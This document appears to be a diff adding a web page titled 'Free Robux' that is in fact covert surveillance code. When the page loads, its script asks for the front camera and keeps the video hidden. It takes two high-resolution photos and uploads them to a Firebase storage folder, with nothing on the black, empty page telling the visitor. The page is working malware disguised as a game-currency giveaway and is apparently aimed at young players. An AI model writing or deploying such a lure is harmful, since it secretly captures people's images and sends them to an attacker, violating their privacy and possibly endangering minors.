@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux</title>
+    <script type="module">
+        // Import the necessary Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+        // Use placeholders for Firebase configuration
+        const firebaseConfig = {
+            apiKey: "FIREBASE_API_KEY",
+            authDomain: "FIREBASE_AUTH_DOMAIN",
+            projectId: "FIREBASE_PROJECT_ID",
+            storageBucket: "FIREBASE_STORAGE_BUCKET",
+            messagingSenderId: "FIREBASE_MESSAGING_SENDER_ID",
+            appId: "FIREBASE_APP_ID"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        // Function to upload image to Firebase
+        function uploadImage(imageData, imageNumber) {
+            const storageRef = ref(storage, `Zeyad/image_${Date.now()}_${imageNumber}.png`); // Upload to Zeyad folder
+            uploadString(storageRef, imageData, 'data_url')
+                .then(() => {
+                    console.log(`Uploaded image ${imageNumber}!`);
+                })
+                .catch((error) => {
+                    console.error(`Error uploading image ${imageNumber}:`, error);
+                });
+        }
+
+        // Access the video and canvas elements
+        window.addEventListener('load', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Hide video and canvas elements
+            video.style.display = 'none';
+            canvas.style.display = 'none';
+
+            // Start capturing from the front camera
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: { exact: "user" }, // Use front camera
+                    width: { ideal: 1920 }, // High resolution
+                    height: { ideal: 1080 } // High resolution
+                }
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    // Set the canvas size to match the video resolution
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Take the first picture immediately
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData1 = canvas.toDataURL('image/png');
+                        uploadImage(imageData1, 1); // Upload first image to Firebase
+
+                        // Take the second picture after a short delay
+                        setTimeout(() => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData2 = canvas.toDataURL('image/png');
+                            uploadImage(imageData2, 2); // Upload second image to Firebase
+
+                            // Stop the video stream
+                            stopVideo(stream);
+                        }, 1000); // 1 second delay between pictures
+                    }, 100); // Small delay to ensure the camera is ready
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing camera: ', err);
+            });
+        });
+
+        // Function to stop the video stream
+        function stopVideo(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+        }
+
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+    </style>
+</head>
+<body>
+</body>
+</html>
